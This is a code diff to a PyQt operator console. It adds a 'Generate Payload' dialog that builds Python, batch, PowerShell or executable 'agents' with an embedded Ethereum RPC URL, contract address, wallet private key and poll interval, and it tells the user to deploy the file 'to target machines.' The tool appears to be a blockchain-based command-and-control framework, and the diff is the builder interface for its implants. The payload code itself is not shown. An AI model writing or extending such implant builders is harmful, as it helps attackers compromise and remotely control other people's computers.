@@ -137,6 +137,12 @@ class AdministratorGUI(QMainWindow):
         
         left_layout.addLayout(session_btn_layout)
         
+        # Payload Generator button
+        self.generate_payload_btn = QPushButton("Generate Payload")
+        self.generate_payload_btn.clicked.connect(self.generate_payload)
+        self.generate_payload_btn.setStyleSheet("background-color: #2ecc71; color: white; font-weight: bold;")
+        left_layout.addWidget(self.generate_payload_btn)
+        
         splitter.addWidget(left_panel)
         
         # Right panel - Tabs
@@ -585,6 +591,174 @@ Agent Messages: {session['agent_seq_num']}
         except Exception as e:
             self.response_text.append(f"Error parsing response: {e}")
             self.log(f"Response parsing error: {e}")
+    
+    def generate_payload(self):
+        """Generate agent payload with embedded configuration"""
+        from PyQt5.QtWidgets import QDialog, QVBoxLayout, QHBoxLayout, QRadioButton, QButtonGroup
+        
+        # Create dialog
+        dialog = QDialog(self)
+        dialog.setWindowTitle("Generate Agent Payload")
+        dialog.setGeometry(200, 200, 600, 400)
+        
+        layout = QVBoxLayout()
+        
+        # Title
+        title = QLabel("<h2>Agent Payload Generator</h2>")
+        layout.addWidget(title)
+        
+        # Configuration inputs
+        config_group = QGroupBox("Agent Configuration")
+        config_layout = QVBoxLayout()
+        
+        # RPC URL
+        rpc_layout = QHBoxLayout()
+        rpc_layout.addWidget(QLabel("RPC URL:"))
+        rpc_input = QLineEdit(self.config.get('rpc_url', ''))
+        rpc_layout.addWidget(rpc_input)
+        config_layout.addLayout(rpc_layout)
+        
+        # Contract Address
+        contract_layout = QHBoxLayout()
+        contract_layout.addWidget(QLabel("Contract:"))
+        contract_input = QLineEdit(self.config.get('contract_address', ''))
+        contract_layout.addWidget(contract_input)
+        config_layout.addLayout(contract_layout)
+        
+        # Private Key
+        key_layout = QHBoxLayout()
+        key_layout.addWidget(QLabel("Private Key:"))
+        key_input = QLineEdit()
+        key_input.setPlaceholderText("Agent wallet private key (leave empty to generate new)")
+        key_layout.addWidget(key_input)
+        config_layout.addLayout(key_layout)
+        
+        # Poll Interval
+        poll_layout = QHBoxLayout()
+        poll_layout.addWidget(QLabel("Poll Interval:"))
+        poll_input = QLineEdit("10")
+        poll_input.setPlaceholderText("Seconds")
+        poll_layout.addWidget(poll_input)
+        config_layout.addLayout(poll_layout)
+        
+        config_group.setLayout(config_layout)
+        layout.addWidget(config_group)
+        
+        # Payload type selection
+        type_group = QGroupBox("Payload Type")
+        type_layout = QVBoxLayout()
+        
+        btn_group = QButtonGroup()
+        
+        py_radio = QRadioButton("Python Script (.py) - Standalone Python file")
+        py_radio.setChecked(True)
+        btn_group.addButton(py_radio)
+        type_layout.addWidget(py_radio)
+        
+        bat_radio = QRadioButton("Batch Script (.bat) - Windows installer")
+        btn_group.addButton(bat_radio)
+        type_layout.addWidget(bat_radio)
+        
+        ps_radio = QRadioButton("PowerShell Script (.ps1) - Windows PowerShell")
+        btn_group.addButton(ps_radio)
+        type_layout.addWidget(ps_radio)
+        
+        exe_radio = QRadioButton("Executable (.exe) - Requires PyInstaller")
+        btn_group.addButton(exe_radio)
+        type_layout.addWidget(exe_radio)
+        
+        type_group.setLayout(type_layout)
+        layout.addWidget(type_group)
+        
+        # Buttons
+        button_layout = QHBoxLayout()
+        
+        generate_btn = QPushButton("Generate")
+        generate_btn.setStyleSheet("background-color: #2ecc71; color: white; padding: 10px;")
+        button_layout.addWidget(generate_btn)
+        
+        cancel_btn = QPushButton("Cancel")
+        cancel_btn.clicked.connect(dialog.reject)
+        button_layout.addWidget(cancel_btn)
+        
+        layout.addLayout(button_layout)
+        
+        dialog.setLayout(layout)
+        
+        def on_generate():
+            # Get configuration
+            config = {
+                'rpc_url': rpc_input.text(),
+                'contract_address': contract_input.text(),
+                'private_key': key_input.text() or self._generate_new_wallet(),
+                'poll_interval': int(poll_input.text() or 10)
+            }
+            
+            # Determine payload type
+            if py_radio.isChecked():
+                ext = ".py"
+                filter_str = "Python Files (*.py)"
+            elif bat_radio.isChecked():
+                ext = ".bat"
+                filter_str = "Batch Files (*.bat)"
+            elif ps_radio.isChecked():
+                ext = ".ps1"
+                filter_str = "PowerShell Files (*.ps1)"
+            else:
+                ext = ".exe"
+                filter_str = "Executable Files (*.exe)"
+            
+            # Ask for save location
+            output_path, _ = QFileDialog.getSaveFileName(
+                self,
+                "Save Agent Payload",
+                f"agent{ext}",
+                filter_str
+            )
+            
+            if not output_path:
+                return
+            
+            try:
+                from administrator.payload_generator import PayloadGenerator
+                generator = PayloadGenerator()
+                
+                # Generate payload
+                if py_radio.isChecked():
+                    generator.generate_python_payload(config, output_path)
+                elif bat_radio.isChecked():
+                    generator.generate_batch_script(config, output_path)
+                elif ps_radio.isChecked():
+                    generator.generate_powershell_script(config, output_path)
+                else:
+                    generator.generate_exe_payload(config, output_path)
+                
+                QMessageBox.information(
+                    self,
+                    "Success",
+                    f"Payload generated successfully!\n\nLocation: {output_path}\n\nAgent Wallet: {config['private_key'][:10]}...\n\nDeploy this file to target machines."
+                )
+                
+                self.log(f"Generated payload: {output_path}")
+                dialog.accept()
+                
+            except Exception as e:
+                QMessageBox.critical(
+                    self,
+                    "Error",
+                    f"Failed to generate payload:\n{str(e)}"
+                )
+                self.log(f"Payload generation error: {e}")
+        
+        generate_btn.clicked.connect(on_generate)
+        
+        dialog.exec_()
+    
+    def _generate_new_wallet(self):
+        """Generate a new Ethereum wallet and return private key"""
+        from eth_account import Account
+        account = Account.create()
+        return account.key.hex()
 
 
 def main():
